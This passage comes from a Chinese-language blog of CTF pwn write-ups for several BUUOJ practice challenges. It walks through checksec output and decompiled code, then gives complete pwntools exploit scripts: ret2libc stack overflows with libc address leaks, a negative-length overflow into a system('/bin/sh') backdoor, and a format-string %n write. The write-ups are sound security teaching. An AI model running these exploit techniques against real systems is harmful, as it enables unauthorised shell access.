class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./2018_rop&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25252</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x80484C6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = <span class="built_in">hex</span>(u32(io.recv().ljust(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>)))</span><br><span class="line"><span class="comment"># print(read_addr)</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,<span class="built_in">int</span>(read_addr,<span class="number">16</span>))</span><br><span class="line">base = <span class="built_in">int</span>(read_addr,<span class="number">16</span>) - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys_addr = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="bjdctf-2020-babyrop">bjdctf_2020_babyrop</h2><ul><li><p>先验文件，本题文件为 <kbd>64</kbd> 位可执行文件，依然照惯例开启了 NX 保护。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ./bjdctf_2020_babyrop </span><br><span class="line">./bjdctf_2020_babyrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=ebe33bb41cb0dcdde518b9dfb38eb03a104ee0b7, not stripped</span><br><span class="line"></span><br><span class="line">└─$ checksec ./bjdctf_2020_babyrop </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/bjdctf_2020_babyrop&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>本地执行一遍，社牛程序一顿豪情壮志之后等待用户输入，输入完成之后程序终止。提示本题为 <kbd>ret2libc</kbd>。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./bjdctf_2020_babyrop</span><br><span class="line">Can u <span class="built_in">return</span> to libc ?</span><br><span class="line">Try u best!</span><br><span class="line">Pull up your sword and tell me u story!</span><br><span class="line">h-t-m myr520</span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译查看伪代码，主函数调用了两个函数，其中 <kbd>vuln()</kbd> 函数读取用户输入的阈值远超所占栈空间大小，因此存在栈溢出。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="comment">// 初始化并打印字符串</span></span><br><span class="line">  <span class="comment">// int init()</span></span><br><span class="line">  <span class="comment">// &#123;</span></span><br><span class="line">  <span class="comment">// 	setvbuf(stdout, 0LL, 2, 0LL);</span></span><br><span class="line">  <span class="comment">// 	setvbuf(stdin, 0LL, 1, 0LL);</span></span><br><span class="line">  <span class="comment">// 	puts(&quot;Can u return to libc ?&quot;);</span></span><br><span class="line">  <span class="comment">// 	return puts(&quot;Try u best!&quot;);</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  vuln(argc, argv);</span><br><span class="line">  <span class="comment">// 打印字符串并读取输入</span></span><br><span class="line">  <span class="comment">// ssize_t vuln()</span></span><br><span class="line">  <span class="comment">// &#123;</span></span><br><span class="line">  <span class="comment">// 	char buf[32]; // [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// 	puts(&quot;Pull up your sword and tell me u story!&quot;);</span></span><br><span class="line">  <span class="comment">// 	return read(0, buf, 0x64uLL);</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>简单查阅过后发现程序确实没有现成的危险套装，所以还是遵从提示用 <kbd>ret2libc</kbd> 解题，使用 <kbd>puts()</kbd> 函数泄露本身地址即可。当然，与前一关不同，本题为 <kbd>64</kbd> 位环境，因此需要使用寄存器传参。构造 <kbd>exp</kbd> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./bjdctf_2020_babyrop&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25910</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x400733</span></span><br><span class="line">vuln_addr = <span class="number">0x40067D</span></span><br><span class="line"><span class="comment"># 返回该函数即可</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = <span class="built_in">hex</span>(u64(io.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)))</span><br><span class="line"><span class="comment"># puts_addr = hex(u64(io.recv(6).ljust(8,b&#x27;\0&#x27;)))</span></span><br><span class="line"><span class="comment"># 此处若使用 recv() 函数接收则需仅接收 6 位，</span></span><br><span class="line"><span class="comment"># 因为真实地址有效部分仅占前 6 位，直接接收会</span></span><br><span class="line"><span class="comment"># 将后续程序打印的字符串全部接收造成错误。</span></span><br><span class="line"><span class="comment"># print(puts_addr)</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,<span class="built_in">int</span>(puts_addr,<span class="number">16</span>))</span><br><span class="line">base = <span class="built_in">int</span>(puts_addr,<span class="number">16</span>) - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="bjdctf-2020-babystack2">bjdctf_2020_babystack2</h2><ul><li><p>先验文件，本题文件为 <kbd>64</kbd> 位可执行文件，依旧照例开启 NX 保护。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ./bjdctf_2020_babystack2  </span><br><span class="line">./bjdctf_2020_babystack2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=98383c4b37ec43aae16b46971bd5ead3f03ce0a6, not stripped</span><br><span class="line"></span><br><span class="line">└─$ checksec ./bjdctf_2020_babystack2 </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/bjdctf_2020_babystack2&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>本地执行一下，映入眼帘的是社牛程序 DJ 款，一通狂欢后提示用户输入姓名的长度，而后则提示输入姓名，其中超过此前输入的长度部分会保留在缓存区，表现为程序接收姓名并终止后剩余字符会在本地 Shell 继续存在。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./bjdctf_2020_babystack2</span><br><span class="line">**********************************</span><br><span class="line">*     Welcome to the BJDCTF!     *</span><br><span class="line">* And Welcome to the bin world!  *</span><br><span class="line">*  Let<span class="string">&#x27;s try to pwn the world!   *</span></span><br><span class="line"><span class="string">* Please told me u answer loudly!*</span></span><br><span class="line"><span class="string">[+]Are u ready?</span></span><br><span class="line"><span class="string">[+]Please input the length of your name:</span></span><br><span class="line"><span class="string">9</span></span><br><span class="line"><span class="string">[+]What&#x27;</span>s u name?</span><br><span class="line">h-t-m myr520</span><br><span class="line"></span><br><span class="line">└─$ 520</span><br><span class="line">520: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译查看伪代码，主函数与本地执行的逻辑基本一致，但是对姓名的长度作了限制，长度大于十便会异常退出。而长度作为读取后续输入的限制条件，这么小的范围正常输入显然是无法栈溢出的。不过，在使用 <kbd>read()</kbd> 函数读取输入时，程序将作为作为长度限制的整形值做了无符号转换（<kbd>unsigned</kbd>），因此若输入值为负数时，不仅可以通过 <kbd>if</kbd> 判断，对于输入的读取限制也会扩大到可供栈溢出。（<kbd>-1</kbd> 补码为 <kbd>11111111</kbd>，无符号转换后为 <kbd>255</kbd>。）<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)nbytes &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oops,u name is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在主函数旁边还有一个后门函数，包含了完整危险套装的调用，因此只需想办法调用该函数即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>栈溢出存在，危险套装都是现成的，因此本题可直接构造如下 <kbd>payload</kbd>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./bjdctf_2020_babystack2&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29589</span>)</span><br><span class="line"></span><br><span class="line">bd_addr = <span class="number">0x400726</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span> + <span class="number">8</span>) + p64(bd_addr)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="jarvisoj-fm">jarvisoj_fm</h2><ul><li><p>先验文件，本题文件为 <kbd>32</kbd> 位可执行文件，开了 <kbd>NX</kbd> 与 <kbd>Canary</kbd> 保护，<kbd>Canary</kbd> 保护会在栈底放入随机数据并每次验证，即以往常规的栈溢出均不能使用，因为会破坏该验证数据。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ./fm                    </span><br><span class="line">./fm: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=e1629654d12bffd18080971a87fb52d9fc88b212, not stripped</span><br><span class="line">                                                                                                                                                                                </span><br><span class="line">┌──(h-t-m㉿h-t-m-kali)-[~]</span><br><span class="line">└─$ checksec ./fm                    </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/fm&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>本地执行一遍，程序直接等待用户输入，读取之后则输出用户输入的内容并换行输出两个字符 <kbd>3!</kbd> 后终止。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./fm                    </span><br><span class="line">h-t-m myr520</span><br><span class="line">h-t-m myr520</span><br><span class="line">3!</span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译查看伪代码，主函数中除了本地执行的基本操作外，额外还有对变量 <kbd>x</kbd> 的判断，若该值为 <kbd>4</kbd> 则直接给出 Shell，但是 <kbd>x</kbd> 为已定义为 <kbd>3</kbd> 的全局变量。由于程序读取数据后使用 <kbd>printf()</kbd> 函数输出数据，因此这里存在一个格式化字符串漏洞，可通过该漏洞完成内存数据改写。好久没实战过的漏洞，上一次还是在 [第五空间2019-决赛-PWN5](https://h-t-m.top/posts/9e217072/#第五空间2019-决赛-PWN5)。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">80</span>]; <span class="comment">// [esp+2Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d!\n&quot;</span>, x);</span><br><span class="line">  <span class="keyword">if</span> ( x == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;running sh...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>首先本地运行并输入如下格式化字符来检验格式化后的字符串在栈中较原参数位的偏移量，通过程序输出结果可看出偏移量为 <kbd>11</kbd>（四个字节）。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./fm                                                                </span><br><span class="line">AAAA-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x</span><br><span class="line">AAAA-fff0a81c-00000050-000003e8-000003e8-ffffffff-000003e8-fff0a934-f7f255c8-0000002c-0000003c-41414141</span><br><span class="line">3!</span><br></pre></td></tr></table></figure></li></ul><h3 id="手写-payload-2">手写 payload</h3><ul><li><p>接下来使用 <kbd>%n</kbd> 来对指定位置的数据指向的位置进行写入即可，由于偏移量为 <kbd>11</kbd>，所以使用 <kbd>%11&#36;n</kbd>。而对于写入数据的控制，只需保证此前正常输出四个字节即可，而变量 <kbd>x</kbd> 的地址值正好。因此构造 <kbd>exp</kbd> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./fm&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29730</span>)</span><br><span class="line"></span><br><span class="line">x_addr = <span class="number">0x804A02C</span></span><br><span class="line"></span><br><span class="line">payload = p32(x_addr) + <span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h3 id="fmtstr-payload-2">fmtstr_payload</h3><ul><li><p>使用 <kbd>fmtstr_payload()</kbd> 的形势如下，还是得题目再复杂点时使用工具才会显得优雅。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./fm&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29730</span>)</span><br><span class="line"></span><br><span class="line">x_addr = <span class="number">0x804A02C</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>,&#123;x_addr:<span class="number">4</span>&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="pwn2-sctf-2016">pwn2_sctf_2016</h2><ul><li><p>先验文件，本题文件为 <kbd>32</kbd> 位可执行文件，仅开启 NX 保护。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ./pwn2_sctf_2016 </span><br><span class="line">./pwn2_sctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=4b6d53bc9aca0e73953173f153dc75bd540d6a48, not stripped</span><br><span class="line"></span><br><span class="line">└─$ checksec ./pwn2_sctf_2016 </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/pwn2_sctf_2016&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>本地执行一下，程序询问将输入的数据长度并请求用户输入相应长度的数据，随后会将用户的数据按预定要求打印出来。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./pwn2_sctf_2016</span><br><span class="line">How many bytes <span class="keyword">do</span> you want me to <span class="built_in">read</span>? 9</span><br><span class="line">Ok, sounds good. Give me 9 bytes of data!</span><br><span class="line">h-t-m myr520</span><br><span class="line">You said: h-t-m myr</span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译查看伪代码，主函数主要调用了 <kbd>vuln()</kbd> 函数，该函数符合本地调用时的行为，对于用户初始设置的长度程序做了最大 <kbd>32</kbd> 的限制。此外，程序读取用户输入使用自定义的 <kbd>get_n()</kbd> 函数，限制长度的参数为 <kbd>unsigned int</kbd>，所以当输入长度值为负数时可绕过限制，即存在栈溢出。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> nptr[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">	<span class="keyword">int</span> v2; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line">    </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;How many bytes do you want me to read? &quot;</span>);</span><br><span class="line">	get_n(nptr, <span class="number">4</span>);</span><br><span class="line">    <span class="comment">// int __cdecl get_n(int a1, unsigned int a2)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//   unsigned int v2; // eax</span></span><br><span class="line">    <span class="comment">//   int result; // eax</span></span><br><span class="line">    <span class="comment">//   char v4; // [esp+Bh] [ebp-Dh]</span></span><br><span class="line">    <span class="comment">//   unsigned int i; // [esp+Ch] [ebp-Ch]</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//   for ( i = 0; ; ++i )</span></span><br><span class="line">    <span class="comment">//   